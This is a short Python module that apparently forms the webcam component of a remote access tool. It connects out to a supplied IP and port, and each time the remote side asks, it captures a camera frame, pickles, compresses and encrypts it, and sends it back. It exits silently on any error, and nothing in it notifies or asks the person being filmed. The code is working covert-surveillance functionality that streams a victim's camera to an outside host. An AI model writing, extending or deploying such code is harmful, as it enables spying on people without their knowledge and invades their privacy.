import socket
import pickle
import zlib
import cv2
from sys import exit
from Specific.encrypt import Encryption


def Cam(ip, port, encoding, position):
  try:
    headersize = 10
    new_msg = True
    msg_len = 0
    full_msg = b''

    e = Encryption()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))

    cam = cv2.VideoCapture(position)

    while True:
      try:
        Cam_msg = s.recv(1024)

        if new_msg:
          msg_len = int(Cam_msg[:headersize])
          new_msg = False

        full_msg += Cam_msg

        if len(full_msg)-headersize == msg_len:
          check, frame = cam.read()
          frame = pickle.dumps(frame)
          frame = zlib.compress(frame, 1)
          frame = e.do_encrypt(frame)

          final_msg = bytes(f'{len(frame):<{headersize}}', encoding) + frame
          s.send(final_msg)

          new_msg = True
          msg_len = 0
          full_msg = b''
      except:
        cam.release()
        cv2.destroyAllWindows()
        exit(0)
  except:
    exit(0)